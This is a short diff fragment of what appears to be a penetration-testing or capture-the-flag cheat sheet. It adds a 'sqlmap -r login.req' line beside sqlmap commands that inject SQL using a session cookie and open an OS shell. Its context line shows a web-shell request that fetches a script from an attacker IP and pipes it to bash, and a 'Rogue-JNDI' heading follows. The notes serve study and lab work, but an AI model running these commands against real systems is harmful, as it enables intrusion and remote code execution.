@@ -996,6 +996,7 @@ http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 ```
 $ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
 $ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
+$ sqlmap -r login.req
 ```
 
 - Rogue-JNDI
